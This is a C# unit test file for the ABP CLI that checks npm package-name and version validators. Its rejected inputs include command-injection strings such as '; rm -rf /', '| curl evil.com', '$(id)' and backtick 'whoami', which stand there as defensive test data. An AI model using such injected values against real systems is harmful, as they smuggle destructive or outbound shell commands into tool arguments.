using Shouldly;
using Volo.Abp.Cli.ProjectModification;
using Volo.Abp.Cli.Utils;
using Xunit;

namespace Volo.Abp.Cli;

public class NpmPackagesUpdater_Tests
{
    [Theory]
    [InlineData("@abp/ng.core", true)]
    [InlineData("@abp/ng.theme.shared", true)]
    [InlineData("@abp/ng.components", true)]
    [InlineData("@volo/abp.ng.lepton-x.core", true)]
    [InlineData("@volo/abp.commercial.ng.ui", true)]
    [InlineData("@volosoft/abp.ng.theme.lepton", true)]
    [InlineData("@abp/core && calc.exe", false)]
    [InlineData("@abp/core; rm -rf /", false)]
    [InlineData("@abp/core | curl evil.com", false)]
    [InlineData("@abp/core`whoami`", false)]
    [InlineData("@abp/core$(id)", false)]
    [InlineData("@abp/core\nnewline", false)]
    [InlineData("@abp/ space", false)]
    [InlineData("@abp/", false)]
    [InlineData("@abp/ng core", false)]
    [InlineData(null, false)]
    [InlineData("", false)]
    public void IsValidNpmPackageName(string packageName, bool expected)
    {
        NpmPackagesUpdater.IsValidNpmPackageName(packageName).ShouldBe(expected);
    }

    [Theory]
    [InlineData("1.0.0", false)]
    [InlineData("^8.0.0", false)]
    [InlineData("~8.0.0", false)]
    [InlineData("8.0.0-preview.1", false)]
    [InlineData("8.0.0-preview20260401", false)]
    [InlineData("8.0.0+build.123", false)]
    [InlineData("latest", false)]
    [InlineData("next", false)]
    [InlineData(null, false)]
    [InlineData("", false)]
    [InlineData("1.0.0 && calc.exe", true)]
    [InlineData("1.0.0; rm -rf /", true)]
    [InlineData("1.0.0 | curl evil.com", true)]
    [InlineData("1.0.0`whoami`", true)]
    [InlineData("1.0.0$(id)", true)]
    [InlineData("1.0.0\nnewline", true)]
    [InlineData(">1.0.0", true)]
    [InlineData("<2.0.0", true)]
    [InlineData("1.0.0|2.0.0", true)]
    public void EnsureSafeVersion(string version, bool shouldThrow)
    {
        if (shouldThrow)
        {
            Should.Throw<CliUsageException>(() => NpmHelper.EnsureSafeVersion(version));
        }
        else
        {
            Should.NotThrow(() => NpmHelper.EnsureSafeVersion(version));
        }
    }
}
